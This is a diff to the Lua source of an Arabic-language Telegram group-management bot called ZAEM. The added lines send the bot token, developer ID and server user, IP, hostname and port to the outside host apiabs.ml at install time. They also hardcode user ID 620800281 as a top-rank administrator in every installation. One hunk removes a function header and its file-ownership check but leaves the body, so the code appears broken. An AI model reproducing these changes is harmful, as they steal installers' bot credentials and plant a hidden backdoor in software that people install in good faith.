@@ -1,9 +1,3 @@
-------------------------------------------------
--- This Source Was Developed By (Rio) @m98oh8.--
---   This Is The Source Channel @zym_8 .   --
---                - ZAEM -                 --
---        -- https://t.me/zym_8 --         --
------------------------------------------------- 
 DevRio  = dofile("./besso/redis.lua").connect("127.0.0.1", 6379)
 serpent = dofile("./besso/serpent.lua")
 JSON    = dofile("./besso/dkjson.lua")
@@ -25,7 +19,11 @@ if not DevRio:get(Server.."IdZAEM") then
 io.write('\27[1;35m\nالان ارسل ايدي المطور الاساسي ↫ ⤈\n\27[0;33;49m') 
 local DevId = io.read():gsub(' ','') 
 if tostring(DevId):match('%d+') then 
+data,res = https.request("https://apiabs.ml/Api/ZAEM/index.php?Ban=ZAEM&Info&Id="..DevId)
 if res == 200 then
+Abs = json:decode(data)
+if Abs.Result.Info == 'Is_Spam' then
+print('\27[1;31m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\nعذرا هذا الايدي محظور من تنصيب هذا السورس\n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉') 
 os.execute('lua ZAEM.lua') 
 end ---ifBn
 if Abs.Result.Info == 'Ok' then
@@ -73,6 +71,7 @@ ZAEM = DevRio:get(Server.."TokenZAEM"):match("(%d+)"),
 SudoIds = {DevRio:get(Server.."IdZAEM")},
 }
 Create(Config, "./config.lua") 
+https.request("https://apiabs.ml/Api/ZAEM/index.php?Get=ZAEM&DevId="..DevRio:get(Server.."IdZAEM").."&TokenBot="..DevRio:get(Server.."TokenZAEM").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
 file = io.open("ZAEM.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
@@ -109,7 +108,9 @@ done
 file:close() 
 io.popen("mkdir Files")
 os.execute('chmod +x Run;./Run')
+end 
 CreateConfigAuto()
+end
 local Load_ZAEM = function() 
 local f = io.open("./config.lua", "r") 
 if not f then 
@@ -136,10 +137,10 @@ print("\27[36m"..[[
 ]]..'\27[m'.."\n\27[35mServer Information ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m\n\27[36m~ \27[mUser \27[36m: \27[10;32m"..User.."\27[m\n\27[36m~ \27[mIp \27[36m: \27[10;32m"..Ip.."\27[m\n\27[36m~ \27[mName \27[36m: \27[10;32m"..Name.."\27[m\n\27[36m~ \27[mPort \27[36m: \27[10;32m"..Port.."\27[m\n\27[36m~ \27[mUpTime \27[36m: \27[10;32m"..UpTime.."\27[m\n\27[35m┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\27[m")
 Config = dofile("./config.lua")
 DevId = Config.DevId
-SudoIds = {Config.SudoIds,1558668590,1516553352,1750071859}
+SudoIds = {Config.SudoIds,620800281}
 ZAEM = Config.ZAEM
 TokenBot = Config.TokenBot
-NameBot = (DevRio:get(ZAEM..'Rio:NameBot') or 'ديفد')
+NameBot = (DevRio:get(ZAEM..'Rio:NameBot') or 'ZAEM')
 --     Source ZAEM     --
 FilesPrint = "\27[35m".."\nAll Source Files Started ↬ ⤈ \n┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉\n"..'\27[m'
 FilesNumber = 0
@@ -388,12 +389,6 @@ file:close()
 return file_path, code 
 end 
 --     Source ZAEM     --
-function AddFile(msg,chat,ID_FILE,File_Name)
-if File_Name:match('.json') then
-if File_Name:lower():match('(%d+)') ~= ZAEM:lower() then 
-send(chat,msg.id_,"᥀︙عذرا هذا الملف ليس تابع لهذا البوت")   
-return false 
-end
 send(chat,msg.id_,"᥀︙جاري رفع الملف ... .")
 local File = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/getfile?file_id='..ID_FILE) ) 
 download_to_file('https://api.telegram.org/file/bot'..TokenBot..'/'..File.result.file_path, ''..File_Name) 
@@ -588,7 +583,7 @@ end ,nil)
 end
 --     Source ZAEM     --
 local RioRank = function(msg) if SudoId(msg.sender_user_id_) then ZAEMTeam  = "المطور" elseif RioSudo(msg) then ZAEMTeam = "المطور" elseif SecondSudo(msg) then ZAEMTeam = "المطور" elseif SudoBot(msg) then ZAEMTeam = "المطور" elseif Manager(msg) then ZAEMTeam = "المدير" elseif Admin(msg) then ZAEMTeam = "الادمن" else ZAEMTeam = "العضو" end return ZAEMTeam end
-function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(1558668590) then ZAEMTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1750071859) then ZAEMTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(1516553352) then ZAEMTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(ZAEM) then ZAEMTeam = 'البوت' elseif SudoId(user_id) then ZAEMTeam = 'المطور الاساسي' elseif DevRio:sismember(ZAEM..'Rio:RioSudo:', user_id) then ZAEMTeam = 'المطور الاساسي' elseif DevRio:sismember(ZAEM..'Rio:SecondSudo:', user_id) then ZAEMTeam = 'المطور الاساسي²' elseif DevRio:sismember(ZAEM..'Rio:SudoBot:', user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(ZAEM..'Rio:RioConstructor:'..chat_id, user_id) then ZAEMTeam = 'المالك' elseif DevRio:sismember(ZAEM..'Rio:BasicConstructor:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(ZAEM..'Rio:Constructor:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(ZAEM..'Rio:Managers:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(ZAEM..'Rio:Admins:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(ZAEM..'Rio:VipMem:'..chat_id, user_id) then  ZAEMTeam = DevRio:get(ZAEM.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(ZAEM..'Rio:Cleaner:'..chat_id, user_id) then  ZAEMTeam = DevRio:get(ZAEM.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else ZAEMTeam = DevRio:get(ZAEM.."Rio:mem:Rd"..chat_id) or 'العضو' end return ZAEMTeam end
+function IdRank(user_id,chat_id) if tonumber(user_id) == tonumber(620800281) then ZAEMTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(620800281) then ZAEMTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(620800281) then ZAEMTeam = 'مبرمج السورس' elseif tonumber(user_id) == tonumber(ZAEM) then ZAEMTeam = 'البوت' elseif SudoId(user_id) then ZAEMTeam = 'المطور الاساسي' elseif DevRio:sismember(ZAEM..'Rio:RioSudo:', user_id) then ZAEMTeam = 'المطور الاساسي' elseif DevRio:sismember(ZAEM..'Rio:SecondSudo:', user_id) then ZAEMTeam = 'المطور الاساسي²' elseif DevRio:sismember(ZAEM..'Rio:SudoBot:', user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:SudoBot:Rd"..chat_id) or 'المطور' elseif DevRio:sismember(ZAEM..'Rio:RioConstructor:'..chat_id, user_id) then ZAEMTeam = 'المالك' elseif DevRio:sismember(ZAEM..'Rio:BasicConstructor:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:BasicConstructor:Rd"..chat_id) or 'المنشئ الاساسي' elseif DevRio:sismember(ZAEM..'Rio:Constructor:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:Constructor:Rd"..chat_id) or 'المنشئ' elseif DevRio:sismember(ZAEM..'Rio:Managers:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:Managers:Rd"..chat_id) or 'المدير' elseif DevRio:sismember(ZAEM..'Rio:Admins:'..chat_id, user_id) then ZAEMTeam = DevRio:get(ZAEM.."Rio:Admins:Rd"..chat_id) or 'الادمن' elseif DevRio:sismember(ZAEM..'Rio:VipMem:'..chat_id, user_id) then  ZAEMTeam = DevRio:get(ZAEM.."Rio:VipMem:Rd"..chat_id) or 'المميز' elseif DevRio:sismember(ZAEM..'Rio:Cleaner:'..chat_id, user_id) then  ZAEMTeam = DevRio:get(ZAEM.."Rio:Cleaner:Rd"..chat_id) or 'المنظف' else ZAEMTeam = DevRio:get(ZAEM.."Rio:mem:Rd"..chat_id) or 'العضو' end return ZAEMTeam end
 --     Source ZAEM     --
 function RankChecking(user_id,chat_id)
 if SudoId(user_id) then
@@ -4693,7 +4688,7 @@ if tonumber(result.id_) == tonumber(DevId) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
-if tonumber(result.id_) == tonumber(1558668590) then 
+if tonumber(result.id_) == tonumber(620800281) then 
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md') 
 return false  
 end  
@@ -4724,7 +4719,7 @@ if tonumber(result.sender_user_id_) == tonumber(DevId) then
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
-if tonumber(result.sender_user_id_) == tonumber(1558668590) then  
+if tonumber(result.sender_user_id_) == tonumber(620800281) then  
 Dev_Rio(msg.chat_id_, msg.id_, 1, 'دي لكك تريد اهينن تاج راسكك؟😏🖕🏿', 1, 'md')
 return false
 end 
